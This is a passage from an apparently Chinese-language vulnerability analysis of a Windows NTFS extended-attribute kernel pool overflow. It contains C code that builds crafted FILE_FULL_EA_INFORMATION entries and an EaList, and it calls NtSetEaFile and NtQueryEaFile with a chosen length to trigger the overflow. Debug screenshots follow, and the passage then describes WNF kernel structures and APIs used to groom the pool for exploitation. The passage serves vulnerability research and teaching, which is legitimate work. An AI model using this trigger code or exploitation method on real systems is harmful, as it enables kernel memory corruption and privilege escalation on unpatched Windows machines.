
根据以上分析，当我们能够构造出`UserBufferLength < padding`时，`RawEaSize <= UserBufferLength – padding`的溢出检查就会失效，从而进行内核池溢出。

总结来说，该漏洞有以下特点：

a) `NtfsCommonQueryEa`函数可通过`ZwQueryEaFIle`函数调用，函数原型如下：

```
NTSTATUS ZwQueryEaFile(
[in]           HANDLE           FileHandle,         //文件句柄
[out]          PIO_STATUS_BLOCK IoStatusBlock,
[out]          PVOID Buffer,         //扩展属性缓冲区（FILE_FULL_EA_INFORMATION结构）
[in]           ULONG            Length,         //缓冲区大小
[in]           BOOLEAN          ReturnSingleEntry,
[in, optional] PVOID            EaList,         //指定需要查询的扩展属性
[in]           ULONG            EaListLength,
[in, optional] PULONG           EaIndex,         //指定需要查询的起始索引
[in]           BOOLEAN          RestartScan
);
```

b) 溢出拷贝时数据和大小均可控。

c) 可以覆盖下一个内核池块。

d) 内核池分配时大小可控，并且可以进行堆布局。

## 漏洞触发

### 触发思路

我们可以使用`NtSetEaFile`函数来为我们自己创建的文件添加EA拓展属性，其函数原型如下：

```
NTSTATUS ZwSetEaFile(
[in]  HANDLE           FileHandle,         //文件句柄
[out] PIO_STATUS_BLOCK IoStatusBlock,
[in]  PVOID Buffer,         //设置的Ea属性，指向FILE_FULL_EA_INFORMATION结构，该结构定义如上。
[in]  ULONG            Length         //Ea属性缓冲区的长度
);
```

该函数的第3个参数是一个`FILE_FULL_EA_INFORMATION`结构的缓冲区，用来指定Ea属性的值。所以我们可以利用EA属性来构造PAYLOAD， 在使用`NtQueryEaFile`函数来触发。

### 触发步骤

创建含有两个`FILE_FULL_EA_INFORMATION`结构的数组。

构造第一个`FILE_FULL_EA_INFORMATION`结构如下：

```
curEa->Flags = 0;  // EaNameLength + EaValueLength + 9 等于当前结构的总大小， 这里构造为18，使padding=2.
curEa->EaNameLength = 3;
curEa->EaValueLength = 6;
// NextEntryOffset指向下一个EA信息，必须4字节对齐。
curEa->NextEntryOffset = (curEa->EaNameLength + curEa->EaValueLength + 3 + 9) & (~3);
memcpy(curEa->EaName, ".PA", 3);
RtlFillMemory(curEa->EaName + curEa->EaNameLength + 1 , 6 , 0);
```

构造第二个`FILE_FULL_EA_INFORMATION`结构如下：

```
curEa = (PFILE_FULL_EA_INFORMATION)((PUCHAR)curEa + curEa->NextEntryOffset) ;
curEa->NextEntryOffset = 0;
curEa->Flags = 0;
// 第二个结构总大小为104
curEa->EaNameLength = 4;
curEa->EaValueLength = 100;
memcpy(curEa->EaName, ".PBB", 4);
RtlFillMemory(curEa->EaName + curEa->EaNameLength + 1 , 100 , 0);
```

调用`NtSetEaFile`函数来设置文件的Ea属性。

构造`NtQueryEaFile`函数的`Ealist`参数如下：

```
memcpy(EaList->EaName, ".PA", strlen(".PA"));
EaList->EaNameLength = (UCHAR)strlen(".PA");
EaList->NextEntryOffset = 12; //必须4字节对齐
EaList = (PFILE_GET_EA_INFORMATION)((PUCHAR)EaList + 12);
memcpy(EaList->EaName, ".PBB", strlen(".PBB"));
EaList->EaNameLength = (UCHAR)strlen(".PBB");
EaList->NextEntryOffset = 0;
```

调用`NtQueryEaFile`函数来触发漏洞，构造该函数的`length`参数为19，该参数可用来控制0环申请内存时的大小。

### 调试

内核池分配

![图片描述](https://bbs.kanxue.com/upload/attach/202201/848410_VGTWNB3QBRPHC2U.png)

![图片描述](https://bbs.kanxue.com/upload/attach/202201/848410_8DR4Y6WYGMZBD9J.png)

第一次内存copy

![图片描述](https://bbs.kanxue.com/upload/attach/202201/848410_KYQ2HDYS7TTJ5XN.png)

`padding`的计算

![图片描述](https://bbs.kanxue.com/upload/attach/202201/848410_G5E33MHZ97HGYX2.png)

溢出检查失效

![图片描述](https://bbs.kanxue.com/upload/attach/202201/848410_23WGGKJTSHWP6VA.png)

第二次内存拷贝时，成功溢出

![图片描述](https://bbs.kanxue.com/upload/attach/202201/848410_NUQNQEGAQVV79W3.png)

## 漏洞利用

### WNF简介

Windows Notification Facitily 是 Windows 中的一个通知系统。

应用程序可以订阅特定类型的事件（`StateName`标识），在每次状态更改时可以进行通知。

### WNF在内核中的数据结构

#### `_WNF_NAME_INSTANCE`

```
+0x000 Header           : _WNF_NODE_HEADER
+0x008 RunRef           : _EX_RUNDOWN_REF
// 每一个WNF_NAME_INSTANCE结构都会根据StateName来挂到树中。
+0x010 TreeLinks        : _RTL_BALANCED_NODE
// wnf Name(3环的StateName ^ 0x41C64E6DA3BC0074)
+0x028 StateName        : _WNF_STATE_NAME_STRUCT
+0x030 ScopeInstance    : Ptr64 _WNF_SCOPE_INSTANCE
+0x038 StateNameInfo    : _WNF_STATE_NAME_REGISTRATION
+0x050 StateDataLock    : _WNF_LOCK
// wnf 数据
+0x058 StateData        : Ptr64 _WNF_STATE_DATA
+0x060 CurrentChangeStamp : Uint4B
+0x068 PermanentDataStore : Ptr64 Void
+0x070 StateSubscriptionListLock : _WNF_LOCK
+0x078 StateSubscriptionListHead : _LIST_ENTRY
+0x088 TemporaryNameListEntry : _LIST_ENTRY
// 指向当前进程的 eprocess结构
+0x098 CreatorProcess   : Ptr64 _EPROCESS
+0x0a0 DataSubscribersCount : Int4B
+0x0a4 CurrentDeliveryCount : Int4B
```

#### `_WNF_SCOPE_INSTANCE`

```
+0x000 Header           : _WNF_NODE_HEADER
+0x008 RunRef           : _EX_RUNDOWN_REF
+0x010 DataScope        : _WNF_DATA_SCOPE
+0x014 InstanceIdSize   : Uint4B
+0x018 InstanceIdData   : Ptr64 Void
+0x020 ResolverListEntry : _LIST_ENTRY
+0x030 NameSetLock      : _WNF_LOCK
// 二叉树，根据这个成员来查找对应的NAME_INSTANCE结构
+0x038 NameSet          : _RTL_AVL_TREE
+0x040 PermanentDataStore : Ptr64 Void
+0x048 VolatilePermanentDataStore : Ptr64 Void
```

#### `_WNF_STATE_DATA`

```
+0x000 Header           : _WNF_NODE_HEADER
// 分配的内核池大小
+0x004 AllocatedSize    : Uint4B
// 当前数据大小
+0x008 DataSize         : Uint4B
+0x00c ChangeStamp      : Uint4B
```

#### `_WNF_STATE_NAME`

```
struct _WNF_STATE_NAME
{
ULONGLONG Version : 4;
ULONGLONG NameLifetime : 2;
// 根据此成员来区分不同的WNF类型
ULONGLONG DataScope : 4;
ULONGLONG PermanentData : 1;
ULONGLONG Sequence : 53;
};
```

### WNF相关API

#### `NtCreateWnfStateName`

```
typedef NTSTATUS  (NTAPI * __NtCreateWnfStateName)(
_Out_ PWNF_STATE_NAME StateName,
_In_ WNF_STATE_NAME_LIFETIME NameLifetime,
_In_ WNF_DATA_SCOPE DataScope,
_In_ BOOLEAN PersistData,
_In_opt_ PCWNF_TYPE_ID TypeId,
_In_ ULONG MaximumStateSize,
_In_ PSECURITY_DESCRIPTOR SecurityDescriptor
);
```

用来创建一个WNF对象，该函数会在0环创建一个`WNF_NAME_INSTANCE`对象，大小为0xb8（`WNF_NAME_INSTANCE + POOL_HEADER`）。

![图片描述](https://bbs.kanxue.com/upload/attach/202201/848410_HNFMW5E6QWSQDV2.png)

（`NtCreateWnfStateName`函数片段）

#### `NtUpdateWnfStateData`

```
typedef NTSTATUS (NTAPI * __NtUpdateWnfStateData)(
_In_ PWNF_STATE_NAME StateName,
_In_reads_bytes_opt_(Length) const VOID * Buffer,
_In_opt_ ULONG Length,
_In_opt_ PCWNF_TYPE_ID TypeId,
_In_opt_ const PVOID ExplicitScope,
_In_ WNF_CHANGE_STAMP MatchingChangeStamp,
_In_ ULONG CheckStamp);
```

更新WNF `StateData`，当`Length`小于`StateData->AllocateSize`时会根据`Length`大小来分配内核池，否则会将`Buffer`中的数据拷贝到内核池中。
